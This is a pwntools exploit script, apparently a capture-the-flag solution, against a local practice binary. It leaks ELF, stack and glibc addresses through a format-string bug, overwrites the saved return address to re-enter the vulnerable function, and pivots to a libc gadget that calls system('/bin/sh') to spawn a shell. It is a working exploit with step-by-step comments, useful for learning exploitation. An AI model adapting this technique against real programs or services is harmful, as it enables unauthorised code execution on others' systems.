from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    brva 0x132b
    brva 0x137a
    brva 0x138b
    continue
''')

# main function calls cave function to execute:
# 1. read(0, rbp-8, 0x12)
# 2. read(0, rbp-0x10, 8)
# 3. printf(rbp-0x10)

# cave function's prologue: push rbp; mov rbp, rsp; sub rsp, 0x10
# cave function's epilogue: leave

# 1. leak elf base addres, initial rbp value, and glibc base address
# first time in cave from main
# overwrite cave function's saved return address to repeat main->cave
p.sendafter(b"Enter your name >> ", b'%9$p%10$p%11$p'.ljust(0x10, b'A')+b'\xc8')
p.sendafter(b"Enter your wish >> ", b'A'*8)
p.recvuntil(b"AAAAAAAA")
elf_base_addr = int(p.recv(14).decode(), 16)-0x13c8
log.info(f"elf base address: {hex(elf_base_addr)}")
initial_rbp_val = int(p.recv(14).decode(), 16)-0xb0
log.info(f"initial rbp value: {hex(initial_rbp_val)}")
glibc_base_addr = int(p.recv(14).decode(), 16)-0x2a1ca
log.info(f"glibc base address: {hex(glibc_base_addr)}")
# after epilogue of cave function, rsp=initial_rbp_val+8

# 2. stack pivot to special gadget to trigger system("/bin/sh")
# second time in cave from main
# after prologue of cave function, rbp=initial_rbp_val, rsp=initial_rbp_val-0x10
# overwrite cave function's saved return address with cave function itself starting from "sub rsp, 0x10"
p.sendafter(b"Enter your name >> ", b'A'*8+p64(initial_rbp_val+0x10)+p16((elf_base_addr+0x12b8)&0xffff))
p.sendafter(b"Enter your wish >> ", b'A'*8)
# after epilogue of cave function, rsp=initial_rbp_val+8, rbp=initial_rbp_val+0x10
# third time in cave directly from itself
# after "sub rsp, 0x10" within prologue of cave function, rsp=initial_rbp_val
glibc_e = ELF('./libc.so.6')
# write glibc system address to initial_rbp_val
# write "/bin/sh\x00" string to initial_rbp_val+8
# write initial_rbp_val+0x60 to initial_rbp_val+0x10
# write special gadget address to initial_rbp_val+0x18 (0x0000000000029882: mov rdi, qword ptr [rbp - 0x58]; call qword ptr [rbp - 0x60];)
p.sendafter(b"Enter your name >> ", p64(glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')))+p64(initial_rbp_val+0x60)+p16((glibc_base_addr+0x29882)&0xffff))
p.sendafter(b"Enter your wish >> ", p64(glibc_base_addr+glibc_e.sym.system))
# after epilogue of cave function, rsp=initial_rbp_val+0x18, rbp=initial_rbp_val+0x60
# after jumping into special gadget, rdi=*(initial_rbp_val+0x60-0x58)=&"/bin/sh\x00", rip=*(initial_rbp_val+0x60-0x60)=glibc_base_addr+glibc_e.sym.system
# system(&"/bin/sh\x00") is triggered by *(initial_rbp_val+0x60-0x60)(*(initial_rbp_val+0x60-0x58))

p.interactive()